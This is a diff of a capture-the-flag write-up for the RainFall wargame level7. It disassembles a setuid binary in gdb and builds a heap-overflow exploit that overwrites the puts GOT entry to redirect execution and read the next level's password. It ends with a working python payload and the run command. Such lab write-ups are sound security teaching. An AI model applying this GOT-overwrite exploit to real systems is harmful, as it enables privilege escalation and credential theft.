@@ -6,28 +6,16 @@ No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RU
 level7@RainFall:~$ ls -l
 -rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7
 
-level7@RainFall:~$ objdump -R level7
-
-level7:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049904 R_386_GLOB_DAT    __gmon_start__
-08049914 R_386_JUMP_SLOT   printf
-08049918 R_386_JUMP_SLOT   fgets
-0804991c R_386_JUMP_SLOT   time
-08049920 R_386_JUMP_SLOT   strcpy
-08049924 R_386_JUMP_SLOT   malloc
-08049928 R_386_JUMP_SLOT   puts
-0804992c R_386_JUMP_SLOT   __gmon_start__
-08049930 R_386_JUMP_SLOT   __libc_start_main
-08049934 R_386_JUMP_SLOT   fopen
-
 level7@RainFall:~$ cat level7
 ...
-��������������Ë$Ð���������U��S���(���t�(f����Ћ���u��[]Ð�S��[��C�����[�%s - %d          ���D$�@�T$�$�������T$�$�X����D�D$D�$`������$������Ð������������UWVS�i������l$0�� ����;����� ���)�����t)1��D$8�,$�D�D$4�D$��� �����9�u߃�[^_]��
+��������������Ë$Ð���������U��S���(���t�(f����Ћ���u��
+[]Ð�S��[��C�����[�%s - %d          ���D$�@�T$�$�������T$�$�X����D�D$D�$`������$������Ð������������UWVS�i������l$0�� ����;����� ���)�����t)1��D$8�,$�D�D$4�D$��� �����9�u߃�[^_]��
 r/home/user/level8/.pass~~;8����T����x�������x����z��zR� <���F
 ...
+
+********************************************************************************
+We can see a printf formatted string "%s - %d" and one pass "r/home/user/level8/.pass"
+********************************************************************************
 
 (gdb) info function
 All defined functions:
@@ -87,6 +75,11 @@ Non-debugging symbols:
 0x08049944  dtor_idx.6161
 0x08049960  c
 
+********************************************************************************
+There is a variable c and two functions m and main, main don't call m. A call to strcpy, printf, fgets 
+time, puts and malloc.
+********************************************************************************
+
 (gdb) disas main
 Dump of assembler code for function main:
    0x08048521 <+0>:	push   %ebp
@@ -113,24 +106,24 @@ Dump of assembler code for function main:
    0x0804857f <+94>:	mov    %eax,%edx                    // met le pointeur dans edx
    0x08048581 <+96>:	mov    0x18(%esp),%eax
    0x08048585 <+100>:	mov    %edx,0x4(%eax)               // ecris le pointeur a la suite de 2 dans le 3eme malloc
-   0x08048588 <+103>:	mov    0xc(%ebp),%eax               // recupere arg1 dans eax ? et y ajoute 4
+   0x08048588 <+103>:	mov    0xc(%ebp),%eax               // recupere argv1 dans eax
    0x0804858b <+106>:	add    $0x4,%eax
-   0x0804858e <+109>:	mov    (%eax),%eax                  // puis met dans eax ce qui se trouve a l'adresse pointee par ce qu'eax contient
-   0x08048590 <+111>:	mov    %eax,%edx                    // stock cela dans edx
+   0x0804858e <+109>:	mov    (%eax),%eax
+   0x08048590 <+111>:	mov    %eax,%edx                    // stock argv1 dans edx
    0x08048592 <+113>:	mov    0x1c(%esp),%eax              // met le pointeur vers le 1er malloc dans eax
    0x08048596 <+117>:	mov    0x4(%eax),%eax               // met le pointeur vers le 2eme malloc dans eax
-   0x08048599 <+120>:	mov    %edx,0x4(%esp)               // met edx a 0x4(esp)
-   0x0804859d <+124>:	mov    %eax,(%esp)                  // met eax a esp
-   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>       // strcpy(2eme malloc, contenu(addr(arg 1 + 4?)))
-   0x080485a5 <+132>:	mov    0xc(%ebp),%eax               // recupere arg1 dans eax
-   0x080485a8 <+135>:	add    $0x8,%eax                    // y ajoute 8
-   0x080485ab <+138>:	mov    (%eax),%eax                  // recupere les 4 octet qui se trouve a l'adresse pointee par arg1+8 et les mets dans eax
+   0x08048599 <+120>:	mov    %edx,0x4(%esp)               // met edx en tant que 2nd argument
+   0x0804859d <+124>:	mov    %eax,(%esp)                  // met eax en 1er argument
+   0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>       // strcpy(2eme malloc, argv1))
+   0x080485a5 <+132>:	mov    0xc(%ebp),%eax               // recupere argv2 dans eax
+   0x080485a8 <+135>:	add    $0x8,%eax
+   0x080485ab <+138>:	mov    (%eax),%eax
    0x080485ad <+140>:	mov    %eax,%edx                    // mets eax dans edx
    0x080485af <+142>:	mov    0x18(%esp),%eax              // met le pointeur vers le 3eme malloc dans eax
    0x080485b3 <+146>:	mov    0x4(%eax),%eax               // met le pointeur vers le 4eme malloc dans eax
-   0x080485b6 <+149>:	mov    %edx,0x4(%esp)               // met contenu(arg1+8) a 0x4esp
-   0x080485ba <+153>:	mov    %eax,(%esp)                  // met le pointeur vers le 4eme malloc a esp
-   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>       // strcpy(pointeur 4eme malloc, contenu(arg1+8))
+   0x080485b6 <+149>:	mov    %edx,0x4(%esp)               // met argv2 en 2nd argument
+   0x080485ba <+153>:	mov    %eax,(%esp)                  // met le pointeur vers le 4eme malloc en 1er argument
+   0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>       // strcpy(pointeur 4eme malloc, argv2)
    0x080485c2 <+161>:	mov    $0x80486e9,%edx
    0x080485c7 <+166>:	mov    $0x80486eb,%eax
    0x080485cc <+171>:	mov    %edx,0x4(%esp)
@@ -139,13 +132,18 @@ Dump of assembler code for function main:
    0x080485d8 <+183>:	mov    %eax,0x8(%esp)
    0x080485dc <+187>:	movl   $0x44,0x4(%esp)
    0x080485e4 <+195>:	movl   $0x8049960,(%esp)
-   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>        // fgets(variable c, 68, fd vers password)
+   0x080485eb <+202>:	call   0x80483c0 <fgets@plt>        // fgets(c, 68, fd)
    0x080485f0 <+207>:	movl   $0x8048703,(%esp)
    0x080485f7 <+214>:	call   0x8048400 <puts@plt>         // puts("~~")
    0x080485fc <+219>:	mov    $0x0,%eax
    0x08048601 <+224>:	leave
    0x08048602 <+225>:	ret
 End of assembler dump.
+
+********************************************************************************
+This function will copy argv1 in the second malloc and argv 2 in the fourth. This
+two str have a size of 8. And will fill the c variable with the pasword we need.
+********************************************************************************
 
 (gdb) disas m
 Dump of assembler code for function m:
@@ -162,6 +160,10 @@ Dump of assembler code for function m:
    0x08048520 <+44>:	ret
 End of assembler dump.
 
+********************************************************************************
+This function will print the content of the c variable.
+So to achieve the exploit we need to call m or jump on it.
+********************************************************************************
 
 level7@RainFall:~$ ./level7
 Segmentation fault (core dumped)
@@ -177,11 +179,13 @@ level7@RainFall:~$ ./level7 a a
 (gdb) x/s 0x8048703
 0x8048703:	 "~~"
 (gdb) x/s 0x8049960
-0x8049960 <c>:	 "" //contient le password
+0x8049960 <c>:	 "" //recuperera le password lors du fgets
 (gdb) x/s 0x80486e0
 0x80486e0:	 "%s - %d\n"
 
+********************************************************************************
 Adress of the four malloc by order:
+********************************************************************************
 
 Breakpoint 1, 0x08048536 in main ()
 (gdb) print $eax
@@ -196,15 +200,147 @@ Breakpoint 4, 0x0804857f in main ()
 (gdb) print $eax
 $4 = 134520888 = 0x0804A038
 
-0x080485c2 in main ()
-(gdb) x/s 0x0804A018
-0x804a018:	 "a"
-(gdb) x/s 0x0804A038
-0x804a038:	 "a"
-(gdb) x/s 0x0804A028
-0x804a028:	 "\002"
-(gdb) x/s 0x0804A008
-0x804a008:	 "\001"
+********************************************************************************
+As we can see the 4 malloc are aligned in the memory, so we can use the overflow 
+on the first strcpy to replace the address of the 4th malloc written in the
+3rd malloc by the address of puts in the GOT, it will permit to the 2nd strcpy to write 
+in it. With the 2nd strcpy we will write the address of m in it and when puts will
+be called it will call m in place.
+********************************************************************************
+
+(gdb) b *main+127
+Breakpoint 1 at 0x80485a0
+(gdb) b *main+132
+Breakpoint 2 at 0x80485a5
+(gdb) run 'AAAABBBBCCCCDDDDEEEEFFFF'
+Breakpoint 1, 0x080485a0 in main ()
+(gdb) i r
+eax            0x804a018	134520856
+ecx            0x20fc1	135105
+edx            0xbffff8b5	-1073743691
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff6a0	0xbffff6a0
+ebp            0xbffff6c8	0xbffff6c8
+esi            0x0	0
+edi            0x0	0
+eip            0x80485a0	0x80485a0 <main+127>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) step
+Breakpoint 2, 0x080485a5 in main ()
+(gdb) i r
+eax            0x804a018	134520856
+ecx            0xbffff8c0	-1073743680
+edx            0x804a023	134520867
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff6a0	0xbffff6a0
+ebp            0xbffff6c8	0xbffff6c8
+esi            0x0	0
+edi            0x0	0
+eip            0x80485a5	0x80485a5 <main+132>
+eflags         0x200202	[ IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) si
+0x080485a8 in main ()
+(gdb) si
+0x080485ab in main ()
+(gdb) si
+0x080485ad in main ()
+(gdb) si
+0x080485af in main ()
+(gdb) i r
+eax            0x0	0
+ecx            0xbffff8c0	-1073743680
+edx            0x0	0
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff6a0	0xbffff6a0
+ebp            0xbffff6c8	0xbffff6c8
+esi            0x0	0
+edi            0x0	0
+eip            0x80485af	0x80485af <main+142>
+eflags         0x200286	[ PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) si
+0x080485b3 in main ()
+(gdb) i r
+eax            0x804a028	134520872
+ecx            0xbffff8c0	-1073743680
+edx            0x0	0
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff6a0	0xbffff6a0
+ebp            0xbffff6c8	0xbffff6c8
+esi            0x0	0
+edi            0x0	0
+eip            0x80485b3	0x80485b3 <main+146>
+eflags         0x200286	[ PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) si
+0x080485b6 in main ()
+(gdb) i r
+eax            0x46464646	1179010630
+ecx            0xbffff8c0	-1073743680
+edx            0x0	0
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff6a0	0xbffff6a0
+ebp            0xbffff6c8	0xbffff6c8
+esi            0x0	0
+edi            0x0	0
+eip            0x80485b6	0x80485b6 <main+149>
+eflags         0x200286	[ PF SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+********************************************************************************
+We find that the offset necessary for argv1 is 20, and as we can see the overflow
+is done in the third malloc.
+********************************************************************************
+
+level7@RainFall:~$ objdump -R level7
+
+level7:     file format elf32-i386
+
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE
+08049904 R_386_GLOB_DAT    __gmon_start__
+08049914 R_386_JUMP_SLOT   printf
+08049918 R_386_JUMP_SLOT   fgets
+0804991c R_386_JUMP_SLOT   time
+08049920 R_386_JUMP_SLOT   strcpy
+08049924 R_386_JUMP_SLOT   malloc
+08049928 R_386_JUMP_SLOT   puts
+0804992c R_386_JUMP_SLOT   __gmon_start__
+08049930 R_386_JUMP_SLOT   __libc_start_main
+08049934 R_386_JUMP_SLOT   fopen
+
+********************************************************************************
+We find the GOT address of puts with objdump and we construct our shellcode like
+argv1 = "20characters+address of puts"
+argv2 = "adress of m".
+********************************************************************************
 
 level7@RainFall:~$ python -c 'print("A"*20+"\x28\x99\x04\x08"+" "+"\xf4\x84\x04\x08")' > /tmp/exploit
 level7@RainFall:~$ var=$(cat /tmp/exploit) ; ./level7 $var
